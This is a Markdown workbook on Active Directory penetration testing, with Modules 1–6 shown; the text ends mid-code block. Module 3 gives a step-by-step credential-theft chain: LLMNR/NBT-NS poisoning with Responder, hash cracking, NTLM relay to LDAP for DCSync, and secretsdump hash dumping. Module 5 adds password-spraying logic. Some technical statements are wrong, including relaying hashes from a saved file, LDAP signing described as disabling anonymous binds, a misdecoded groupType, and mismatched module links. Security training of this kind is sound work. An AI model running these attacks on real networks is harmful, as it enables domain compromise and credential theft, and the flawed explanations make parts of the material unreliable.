
# 🧠 Active Directory Pentesting Workbook

---

## Table of Contents

1. [Module 1: Introduction to Active Directory](#module-1)
2. [Module 2: Initial Enumeration & Reconnaissance](#module-2)
3. [Module 3: LLMNR/NBT-NS Poisoning (Linux & Windows)](#module-3)
4. [Module 4: Enumerating Users, Groups & Privileged](#module-4)
5. [Module 5: Reviewing Domain Password Policies & Attack Opportunities](#module-5)
6. [Module 6: Identifying Built-In Groups & Default Security Settings](#module-6)
7. [Module 7: Credentialed Enumeration (Linux & Windows)](#module-7)
8. [Module 8: Enumerating Security Controls (GPOs, ACLs, AD CS, AEP)](#module-8)
9. [Module 9: Password Spraying (Building Target Lists; Linux & Windows)](#module-9)
10. [Module 10: Enumerating Computers, SPN Delegation & Trust Relationships](#module-10)
11. [Module 11: Kerberos Attacks](#module-11)
12. [Module 12: ACL & DCSync Abuse](#module-5)
13. [Module 13: Domain Trust & Forest Attacks](#module-6)
14. [Module 14: AD Certificate Services Enumeration & Abuses](#module-7)
15. [Module 15: Miscellaneous Misconfigurations](#module-8)
16. [Module 16: Lateral Movement & Privilege Escalation](#module-9)
17. [Module 17: Persistence & Cleanup](#module-10)
---

## <a name="module-1"></a> Module 1: Introduction to Active Directory

*(If you’re already familiar with AD basics—domains, forests, DCs, LDAP, Kerberos, DNs, CNs, DCs—feel free to skip to Module 2.)*

### Introduction  
Active Directory (AD) is Microsoft’s directory service—a centralized database and collection of services that manage users, computers, and resources in a Windows network. If a company is the “kingdom,” then Active Directory is the “grand library” containing everything about citizens (users), “castles” (servers), “royal decrees” (policies), and “keystones” (credentials). For pentesters, understanding AD is critical because most enterprise-level Windows environments rely on it entirely.

### Definitions  
1. **Directory Service**  
   - A system that stores information about objects (users, computers, printers, etc.) in a network and allows querying and management of that information.  

2. **Domain**  
   - A logical grouping of objects that share a common AD database and security policies.  

3. **Domain Controller (DC)**  
   - A server that holds a writable copy of the AD database and responds to authentication requests.  

4. **Forest**  
   - A collection of one or more domains that share a common schema and global catalog.  

5. **Organizational Unit (OU)**  
   - A container within a domain used to organize objects hierarchically.  

6. **Lightweight Directory Access Protocol (LDAP)**  
   - A protocol to query and modify directory services like AD.  

7. **Global Catalog (GC)**  
   - A DC that holds a partial replica of all objects in the forest for fast searches.  

8. **Kerberos**  
   - The primary authentication protocol in AD.  

9. **Distinguished Name (DN)**  
   - The unique path of an object in AD. Format:  
     ```
     CN=UserName,OU=OrgUnit,DC=domain,DC=tld
     ```  

10. **Common Name (CN)**  
    - The attribute in AD that typically holds a display name.  
11. **Domain Component (DC)**  
    - Each segment of the domain name in a DN.  

### Why It Matters  
- Over 90% of large organizations run Windows and rely on AD for authentication and authorization.  
- A successful pentest almost always involves pivoting through AD—finding weak passwords, abusing misconfigured groups, and elevating to Domain Admin.  

### Tools & Commands  

#### Built-In Windows Commands  
- `dsquery` (legacy):  
  ```
  dsquery user -name *
  dsquery group -name "Domain Admins"
  ```  
- `net user`:  
  ```
  net user <username> /domain
  ```  
- `net group`:  
  ```
  net group "Domain Admins" /domain
  ```  
- `whoami`:  
  ```
  whoami
  whoami /groups
  ```

#### PowerShell (AD Module)  
- Import AD module:  
  ```powershell
  Import-Module ActiveDirectory
  ```  
- Get domain information:  
  ```powershell
  Get-ADDomain
  Get-ADForest
  ```  
- List AD users:  
  ```powershell
  Get-ADUser -Filter * | Select Name
  ```

#### LDAP Queries (ldapsearch)  
- Find defaultNamingContext:  
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -s base -b "" "(objectClass=*)" defaultNamingContext
  ```  
- List all users:  
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,distinguishedName
  ```  
- List all groups:  
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
  ```  

### Step-by-Step Guide  

#### 1. Verify Domain-Joined Machine  
- Check domain:  
  ```bat
  echo %USERDOMAIN%
  ```  
- Check logon server:  
  ```bat
  echo %LOGONSERVER%
  ```  
- PowerShell:  
  ```powershell
  whoami
  whoami /groups
  ```

#### 2. Discover FQDN via DNS  
- Run nslookup:  
  ```bat
  nslookup corp
  ```  
- PowerShell:  
  ```powershell
  Get-ADDomain | Select-Object DNSRoot, NetBIOSName
  ```

#### 3. Enumerate Domain Controllers  
- `nltest`:  
  ```bat
  nltest /dclist:CORP
  ```  
- PowerShell:  
  ```powershell
  Get-ADDomainController -Filter * | Select HostName,IPv4Address
  ```  
- LDAP:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=domainController)" name,distinguishedName
  ```

#### 4. Verify Reachability  
- Ping:  
  ```bat
  ping DC01.corp.local
  ```  
- SMB share:  
  ```bat
  net view \\DC01.corp.local
  ```  

#### 5. Retrieve Default Naming Context  
- RootDSE query:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -s base -b "" "(objectClass=*)" defaultNamingContext
  ```

### Common Pitfalls  
- Confusing NetBIOS vs. FQDN  
- Wrong Base DN  
- SMB blocked by firewall  
- Assuming only one DC  

### Next Steps  
- **Module 2**: Enumerating Users, Groups & Privileged Accounts  
- **Module 3**: Reviewing Domain Password Policies & Attack Opportunities  
- **Module 4**: Built-In Groups & Default Security Settings  

---

## <a name="module-2"></a> Module 2: Initial Enumeration & Reconnaissance

_Learn how to gather intel—both anonymously and with low-privilege credentials._

### Key Concepts

-   **Anonymous Bind**  
    A way to connect to LDAP without providing a username or password—like browsing a public bookshelf. You can see basic containers (Schema, Configuration, Domain) but no sensitive details.
    
-   **Low-Privilege Account**  
    A regular user account with minimal rights, like a guest pass. You can query most directory information without modifying anything.
    
-   **Reconnaissance**  
    The process of quietly mapping out the AD environment: discovering domains, OUs, and naming contexts before attempting any deeper attacks.
    

----------

### Container Names Explained

After an anonymous bind, you’ll often see three top-level containers:

1.  **Schema**
    
    -   Think of Schema as the blueprint or dictionary for Active Directory. It defines every object type (user, computer, group) and attribute (name, email, password policy) that AD supports.
        
2.  **Configuration**
    
    -   Configuration is like the master settings file for your entire AD forest. It contains data on sites, services, and replication topology—how DCs talk to each other.
        
3.  **Domain (e.g., lab.local)**
    
    -   This is the container holding all actual user, computer, and group objects for your domain. The name (lab.local) is your domain’s DNS name and forms the base Distinguished Name (DN) for domain queries.
        

----------

### Tools & Commands

-   **ldapsearch** – Query AD anonymously or as a low-privilege user
    
    ```bash
    # Anonymous bind
    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local"
    # Authenticated bind
    ldapsearch -x -H ldap://dc1.lab.local -D "LAB\User1" -w Pass123 -b "DC=lab,DC=local"
    
    ```
    
-   **whoami** – Check current user and group memberships on Windows
    
    ```bat
    whoami /groups
    
    ```
----------

### Step-by-Step Guide

1.  **Anonymous LDAP query**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local"
    
    ```
    
    _Look for container names:_
    
    ```text
    Schema
    Configuration
    lab.local
    
    ```
    
2.  **Authenticated LDAP query**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local -D "LAB\User1" -w Pass123 -b "DC=lab,DC=local"
    
    ```
    
    _Notice additional attributes like email, descriptions._
    
3.  **Determine naming contexts**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local -s base -b "" "(objectClass=*)" defaultNamingContext
    
    ```
    
    _Records default domain DN (e.g., `DC=lab,DC=local`)._
    

----------

### Expected Result

Listings of top-level containers and naming contexts, giving you the base DNs for further queries.

----------

### Mitigation & Hardening

-   Disable anonymous LDAP binds via Group Policy: **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Domain controller: LDAP server signing requirements** → Require signing.
    
-   Audit and restrict low-privilege account directory read permissions.
    

----------

### Next Steps

-   **Attack Type:** Enumeration
    
-   **Attack Path:**
    
    1.  Use naming contexts to enumerate OUs and trusts.
        
    2.  Move on to **Initial Enumeration of the Domain**.
        

----------
## <a name="module-3"></a> Module 3: LLMNR/NBT-NS Poisoning (Linux & Windows)

_Capture NTLMv2 hashes by spoofing local name-resolution queries._

### Key Concepts

-   **LLMNR (Link-Local Multicast Name Resolution)**  
    A fallback protocol Windows uses when DNS can’t resolve a name. Computers broadcast queries like “Who is PRINTER1?” on the local network.
    
-   **NBT-NS (NetBIOS Name Service)**  
    An older Windows protocol for name resolution over NetBIOS, similar to LLMNR but on the legacy NetBIOS layer.
    
-   **Poisoning**  
    Sending fake responses to name-resolution requests, tricking clients into authenticating to the attacker’s machine.
    
-   **NTLMv2 Hash**  
    A challenge-response packet from the NT LAN Manager protocol. Capturing this hash allows offline cracking of the user’s password.
    
-   **SMB Signing**  
    A security feature requiring cryptographic signing of SMB messages to prevent relay attacks.
    
-   **DRSUAPI (Directory Replication Service Remote Protocol)**  
    The interface that Domain Controllers expose for replication. By relaying NTLM auth to LDAP with the DRSUAPI interface, the attacker can pull password hashes (DCSync attack).
    
-   **DCSync Attack**  
    An attack where a non-DC node imitates a DC and requests directory replication, extracting the NTDS.dit database including all user hashes.
    

----------

### Tools & Commands

-   **Responder** (Kali Linux) – Poison LLMNR/NBT-NS to capture NTLMv2 hashes
    
    ```bash
    # 1. Edit config to enable only LLMNR/NBNS poisoning
    vim /etc/responder/Responder.conf
    #   Under [Responder Core], set:
    #   HTTP = Off
    #   SMB = Off
    #   NBNS = On
    #   LLMNR = On
    
    # 2. Start Responder on interface eth0
    responder -I eth0 -wr
    
    ```
    
-   **ntlmrelayx.py** (Impacket) – Relay captured hashes to services
    
    ```bash
    # Relay to SMB (share access)
    ntlmrelayx.py -t smb://dc1.lab.local --smb2support
    
    # Relay to LDAP (DCSync)
    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
    
    ```
    
-   **hashcat** – Crack NTLMv2 hashes offline
    
    ```bash
    # NTLMv2 mode 5600
    hashcat -m 5600 captured.hash wordlist.txt
    
    ```
    

----------

### Step-by-Step Guide

1.  **Poison name-resolution**
    
    ```bash
    responder -I eth0 -wr
    
    ```
    
    _Output:_ Logs in `/usr/share/responder/logs/Responder-Session.log` capturing NTLMv2 hashes.
    
2.  **Trigger name lookups on target**
    
    ```bat
    ping NONEXISTENT-SRV
    
    ```
    
    _Windows sends LLMNR/NBT-NS queries that Responder poisons._
    
3.  **Extract captured hashes**
    
    ```bash
    grep "NTLMv2-SSP" /usr/share/responder/logs/Responder-Session.log > captured.hash
    
    ```
    
    _`captured.hash` now contains challenge-response pairs._
    
4.  **Crack hashes**
    
    ```bash
    hashcat -m 5600 captured.hash wordlist.txt
    
    ```
    
    _Look for recovered plaintext passwords._
    
5.  **Relay valid credentials**
    
    ```bash
    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
    
    ```
    
    _Explanation:_ ntlmrelayx takes the captured NTLMv2 hash from `captured.hash` and uses it to perform SMB or LDAP authentication to the target (dc1.lab.local). When relaying to LDAP with the DRSUAPI interface, it effectively logs in as the original user (whose hash you captured) without needing the plaintext password. The DC sees an authenticated session and grants replication rights if that user has them, enabling a DCSync.
    
    _Details of credential usage:_
    
    -   The relay tool uses the NTLMv2 hash as proof of knowledge of the password, performing the NTLM protocol handshake with the DC.
        
    -   No plaintext password is required; the hash itself is sufficient for authentication.
        
    
    _Look for:_
    
    ```text
    [+] Accepting connection from 10.0.0.5, relaying to ldap://dc1.lab.local
    [+] Authenticating as UserA using NTLMv2 hash
    [+] DRSUAPI may be used to replicate directory
    [+] Dumping credentials for domain: lab.local
    
    ```
    

----------

### Expected Result

-   A file `captured.hash` containing NTLMv2 hashes.
    
-   **Hashcat** outputs plaintext credentials, e.g., `UserA:Password123`.
    
-   **ntlmrelayx.py** shows messages like:
    
    ```text
    [+] DRSUAPI may be used to replicate directory
    [+] Dumping credentials for domain: lab.local
    
    ```
    
-   **secretsdump.py** execution dumps NTDS.dit hashes, for example:
    
    ```bash
    secretsdump.py -just-dc lab.local/attacker@dc1.lab.local
    
    ```
    
    ```text
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:1122334455...
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5566778899...
    
    ```
    

----------

### Mitigation & Hardening

-   **Disable LLMNR/NBT-NS** via GPO:  
    Computer Configuration → Policies → Administrative Templates → Network → DNS Client → **Turn off multicast name resolution** → Enabled
    
-   **Enable SMB Signing** on servers:
    
    ```powershell
    Set-SmbServerConfiguration -RequireSecuritySignature $true
    
    ```
    

----------

### Next Steps

-   **Attack Type:** Credential Capture → NTLM Relay → Privilege Escalation
    
-   **Attack Path:**
    
    1.  Crack captured NTLMv2 hashes.
        
    2.  Validate credentials via SMB (e.g., `smbclient`) or WinRM (`evil-winrm`).
        
    3.  Perform DCSync via LDAP relay.
        
    4.  Dump NTDS.dit hashes and forge Golden Tickets for persistence.
        

----------
## <a name="module-4"></a> Module 4: Enumerating Users, Groups & Privileged Accounts

### Introduction  
Learn to list all users, identify privileged users (`adminCount=1`), find AS-REP roastable, service accounts, disabled users, and enumerate groups.

### Definitions  
1. **sAMAccountName**: Pre-Windows 2000 username.  
2. **userAccountControl**: Bitmask controlling account properties (enabled, disabled, preauth, etc.).  
3. **adminCount**: Indicates protected accounts in privileged groups.  
4. **Service Principal Name (SPN)**: Identifier for a service instance.  
5. **AS-REP Roasting**: Attacking accounts with `DONT_REQUIRE_PREAUTH`.  
6. **Disabled Account**: `ACCOUNTDISABLE` flag in `userAccountControl`.  
7. **Fine-Grained Password Policy (FGPP)**: PSOs for specific users/groups.  
8. **Global / Domain Local / Universal Groups**: Scope of groups.  
9. **groupType**: Bitmask indicating group scope and security.  

### Why It Matters  
- Privileged users lead to early domain compromise.  
- Service accounts can be Kerberoasted.  
- AS-REP roastable accounts can be cracked offline.  

### Tools & Commands  

#### LDAP Queries  
- All users:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,userAccountControl,adminCount,distinguishedName
  ```  
- Privileged users:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName,memberOf,adminCount
  ```  
- AS-REP roastable:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName,userAccountControl
  ```  
- Service accounts (SPNs):  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
  ```  
- Disabled users:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName,userAccountControl,memberOf,whenChanged
  ```  
- All groups:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
  ```  
- Members of “Domain Admins”:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
  ```  
- Recursive group membership:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=jdoe,CN=Users,DC=corp,DC=local))" cn,distinguishedName
  ```  

#### PowerShell  
- List all users:  
  ```powershell
  Get-ADUser -Filter * -Properties sAMAccountName,memberOf
  ```  
- List all groups:  
  ```powershell
  Get-ADGroup -Filter * | Select Name
  ```  
- Get privileged users:  
  ```powershell
  Get-ADUser -Filter {adminCount -eq 1} -Properties memberOf
  ```  
- Get SPN accounts:  
  ```powershell
  Get-ADUser -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName
  ```  
- Get disabled users:  
  ```powershell
  Get-ADUser -Filter {Enabled -eq $false} -Properties memberOf,whenChanged
  ```  

### Decoding userAccountControl  
| Flag Name                         | Value | Purpose                         |
|-----------------------------------|-------|---------------------------------|
| NORMAL_ACCOUNT (512)              | 512   | Normal, enabled user            |
| ACCOUNTDISABLE (2)                | 2     | Account is disabled             |
| DONT_EXPIRE_PASSWORD (65536)      | 65536 | Password never expires          |
| DONT_REQUIRE_PREAUTH (4194304)    | 4194304 | AS-REP Roastable              |

### Step-by-Step Guide  

#### 1. Enumerate All Users  

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,userAccountControl,adminCount,distinguishedName
```

**Expected Output (partial)**:  
```
dn: CN=Administrator,CN=Users,DC=corp,DC=local
sAMAccountName: Administrator
userAccountControl: 512
adminCount: 1

dn: CN=jdoe,CN=Users,DC=corp,DC=local
sAMAccountName: jdoe
userAccountControl: 512
adminCount: 0

dn: CN=svc_sql,CN=Users,DC=corp,DC=local
sAMAccountName: svc_sql
userAccountControl: 66048
adminCount: 0

dn: CN=svc_legacy,CN=Users,DC=corp,DC=local
sAMAccountName: svc_legacy
userAccountControl: 4260352
adminCount: 0
```

- `Administrator`: Normal (512) + Protected (adminCount=1).  
- `jdoe`: Normal user.  
- `svc_sql`: Service account (66048 = Normal + PwdNeverExpires).  
- `svc_legacy`: Service account + DONT_REQUIRE_PREAUTH.

#### 2. Privileged Users (`adminCount=1`)

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName,memberOf
```

**Expected Output**:  
```
dn: CN=Administrator,CN=Users,DC=corp,DC=local
sAMAccountName: Administrator
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local

dn: CN=jsmith,CN=Users,DC=corp,DC=local
sAMAccountName: jsmith
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local

dn: CN=svc_backup,CN=Users,DC=corp,DC=local
sAMAccountName: svc_backup
memberOf: CN=Backup Operators,CN=Users,DC=corp,DC=local
```

#### 3. AS-REP Roastable Accounts

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName,userAccountControl
```

**Expected Output**:  
```
dn: CN=svc_legacy,CN=Users,DC=corp,DC=local
sAMAccountName: svc_legacy
userAccountControl: 4260352

dn: CN=svc_oldjr,CN=Users,DC=corp,DC=local
sAMAccountName: svc_oldjr
userAccountControl: 4194304
```

#### 4. Service Accounts with SPNs

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
```

**Expected Output**:  
```
dn: CN=svc_sql,CN=Users,DC=corp,DC=local
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/sqlsrv.corp.local:1433

dn: CN=svc_ftp,CN=Users,DC=corp,DC=local
sAMAccountName: svc_ftp
servicePrincipalName: ftp/corp.local
```

#### 5. Disabled Users

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName,userAccountControl,memberOf,whenChanged
```

**Expected Output**:  
```
dn: CN=test_user,CN=Users,DC=corp,DC=local
sAMAccountName: test_user
userAccountControl: 514
memberOf: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
whenChanged: 20250210123045.0Z

dn: CN=svc_oldsvc,CN=Users,DC=corp,DC=local
sAMAccountName: svc_oldsvc
userAccountControl: 66050
memberOf: CN=Backup Operators,CN=Users,DC=corp,DC=local
whenChanged: 20240104101530.0Z
```

#### 6. Enumerate All Groups

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
```

**Expected Output**:  
```
dn: CN=Domain Users,CN=Users,DC=corp,DC=local
cn: Domain Users
groupType: -2147483646

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
groupType: -2147483646

dn: CN=Backup Operators,CN=Users,DC=corp,DC=local
cn: Backup Operators
groupType: -2147483646

dn: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
cn: IT-Helpdesk
groupType: -2147483648

dn: CN=CORP_Admins,OU=Groups,DC=corp,DC=local
cn: CORP_Admins
groupType: -2147483644
```

#### 7. Decode groupType Values  
- `-2147483646` (0x80000002) = Global Security Group  
- `-2147483648` (0x80000000) = Global Security Group  
- `-2147483644` (0x80000004) = Universal Security Group  

#### 8. Enumerate Members of “Domain Admins”

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
```

**Expected Output**:  
```
dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
member: CN=Administrator,CN=Users,DC=corp,DC=local
member: CN=jsmith,CN=Users,DC=corp,DC=local
member: CN=svc_backup,CN=Users,DC=corp,DC=local
```

#### 9. Recursive Group Membership

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn,distinguishedName
```

**Expected Output**:  
```
dn: CN=Admins,OU=Groups,DC=corp,DC=local
cn: Admins

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
```

### Common Pitfalls  
- Misreading `userAccountControl` flags  
- Forgetting `objectCategory=person` when filtering users  
- Ignoring FGPP overrides  
- Overlooking nested group membership  

### Next Steps  
- **Module 3**: Reviewing Domain Password Policies & Attack Opportunities  
- **Module 4**: Identifying Built-In Groups & Default Security Settings  

---

## <a name="module-5"></a> Module 5: Reviewing Domain Password Policies & Attack Opportunities

### Introduction  
Learn to evaluate default domain policy and FGPP (PSOs) to decide whether to use password spraying, brute-forcing, Kerberoasting, or AS-REP roasting.

### Definitions  
1. **Password Policy**: Rules for password complexity, length, expiration.  
2. **Group Policy Object (GPO)**: Collection of policies applied to users/computers.  
3. **Fine-Grained Password Policy (FGPP / PSO)**: Password settings applied to specific users or groups.  
4. **Lockout Threshold**: Number of failed attempts before lockout.  
5. **Password History Count**: Number of previous passwords remembered.  

### Why It Matters  
- Weak policies = password spraying or brute-forcing can succeed.  
- Strong policies = pivot to Kerberoast or AS-REP roast.

### Tools & Commands  

#### Command Prompt  
- Default policy:  
  ```bat
  net accounts /domain
  ```

#### PowerShell  
- Default policy:  
  ```powershell
  Get-ADDefaultDomainPasswordPolicy | Format-List *
  ```  
- FGPP:  
  ```powershell
  Get-ADFineGrainedPasswordPolicy | Format-List Name,msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence
  ```

#### LDAP Queries  
- Find PSOs:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence,msDS-PSOAppliesTo
  ```

### Step-by-Step Guide  

#### 1. Check Default Domain Policy  

```bat
net accounts /domain
```

**Expected Output**:  
```
Minimum password length: 7
Lockout threshold: 5
Lockout duration: 30 minutes
Maximum password age: 90 days
Minimum password age: 1 day
```

#### 2. PowerShell Default Policy  

```powershell
Get-ADDefaultDomainPasswordPolicy | Format-List *
```

**Expected Output**:  
```
ComplexityEnabled: True
MinPasswordLength : 7
LockoutThreshold : 5
PasswordHistoryCount: 24
...
```

#### 3. Enumerate FGPP (PSOs)  

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence,msDS-PSOAppliesTo
```

**Expected Output**:  
```
dn: CN=StrictAdminsPSO,CN=Password Settings Container,CN=System,DC=corp,DC=local
msDS-MinimumPasswordLength: 14
msDS-LockoutThreshold: 3
msDS-PasswordHistoryLength: 50
msDS-PasswordSettingsPrecedence: 1
msDS-PSOAppliesTo: CN=Domain Admins,CN=Users,DC=corp,DC=local

dn: CN=LegacySvcPSO,CN=Password Settings Container,CN=System,DC=corp,DC=local
msDS-MinimumPasswordLength: 12
msDS-LockoutThreshold: 0
msDS-PasswordHistoryLength: 0
msDS-PasswordSettingsPrecedence: 2
msDS-PSOAppliesTo: CN=ServiceAccounts,OU=Groups,DC=corp,DC=local
```

### Attack Decision Logic  
- **MinLength ≤ 7 & Complexity = False**: Password spraying.  
- **Strong Policy** (MinLength ≥ 14): Skip brute-forcing users; target Kerberoast/AS-REP.  
- **PSO for DAs**: If StrictAdminsPSO applies to DAs, do not spray DAs; focus on service accounts.

### Common Pitfalls  
- `net accounts /domain` hides PSOs.  
- Overlooking `Password Never Expires`.  
- Ignoring `LockoutThreshold` when spraying.

### Next Steps  
- **Module 4**: Identifying Built-In Groups & Default Security Settings  

---

## <a name="module-6"></a> Module 6: Identifying Built-In Groups & Default Security Settings

### Introduction  
Enumerate all groups, decode their `groupType`, identify built-in and custom high-priv groups, and examine ACLs for shadow admin paths.

### Definitions  
1. **groupType**: Bitmask for group scope (Global, Universal, Domain Local) and security.  
2. **Security Group vs. Distribution Group**: Security groups assign permissions; distribution do not.  
3. **Built-In Groups**: Default AD groups under `CN=Builtin,DC=corp,DC=local`.  
4. **ACL (Access Control List)**: List of ACEs granting/denying rights to principals.  
5. **ACE (Access Control Entry)**: Single entry specifying principal, rights (e.g., `GenericAll`, `WriteDACL`), and inheritance.  
6. **GenericAll**: Full control over an object.  
7. **GenericWrite**: Write properties on object.  
8. **WriteDACL**: Modify the ACL itself.  
9. **Shadow Admins**: Accounts/groups not in DA but with rights leading to DA.

### Why It Matters  
- High-priv groups (DA, EA) obvious. Custom or built-in groups (Backup Operators, Account Operators) also powerful.  
- ACL misconfigs let low-priv users escalate without credentials.

### Tools & Commands  

#### LDAP Queries  
- All groups:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
  ```  
- Built-In groups:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
  ```  
- Members of “Domain Admins”:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
  ```  
- Recursive membership:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=<DN>))" cn,member
  ```

#### PowerShell  
- List groups with scope:  
  ```powershell
  Get-ADGroup -Filter * | Select Name,GroupScope,GroupCategory
  ```  
- Built-In groups:  
  ```powershell
  Get-ADGroup -SearchBase "CN=Builtin,DC=corp,DC=local" -Filter * | Select Name
  ```  
- Recursive members:  
  ```powershell
  Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select Name,sAMAccountName,objectClass
  ```  
- ACL on OU:  
  ```powershell
  $acl = Get-Acl "AD:OU=Admins,DC=corp,DC=local"
  $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" }
  ```

#### BloodHound  
- Collect data:  
  ```powershell
  Invoke-SharpHound -CollectionMethod ACL,Group,Session,LocalAdmin
  ```  
- Visualize: Load JSON into BloodHound GUI and run “Find Shortest Paths to Domain Admins”.

### Step-by-Step Guide  

#### 1. Enumerate All Groups & Decode `groupType`

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
```

**Expected Output (partial)**:  
```
dn: CN=Domain Users,CN=Users,DC=corp,DC=local
cn: Domain Users
groupType: -2147483646

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
groupType: -2147483646

dn: CN=Backup Operators,CN=Users,DC=corp,DC=local
cn: Backup Operators
groupType: -2147483646

dn: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
cn: IT-Helpdesk
groupType: -2147483648

dn: CN=CORP_Admins,OU=Groups,DC=corp,DC=local
cn: CORP_Admins
groupType: -2147483644
```

- `-2147483646` (0x80000002): Global Security Group  
- `-2147483648` (0x80000000): Global Security Group  
- `-2147483644` (0x80000004): Universal Security Group  

#### 2. Enumerate Built-In Groups

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
```

**Expected Output**:  
```
dn: CN=Administrators,CN=Builtin,DC=corp,DC=local
cn: Administrators

dn: CN=Users,CN=Builtin,DC=corp,DC=local
cn: Users

dn: CN=Guests,CN=Builtin,DC=corp,DC=local
cn: Guests

dn: CN=Account Operators,CN=Builtin,DC=corp,DC=local
cn: Account Operators

dn: CN=Backup Operators,CN=Builtin,DC=corp,DC=local
cn: Backup Operators

dn: CN=Server Operators,CN=Builtin,DC=corp,DC=local
cn: Server Operators

dn: CN=Print Operators,CN=Builtin,DC=corp,DC=local
cn: Print Operators
```

#### 3. Enumerate Members of High-Privilege Groups

- Domain Admins:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
  ```

- Enterprise Admins:  
  ```bash
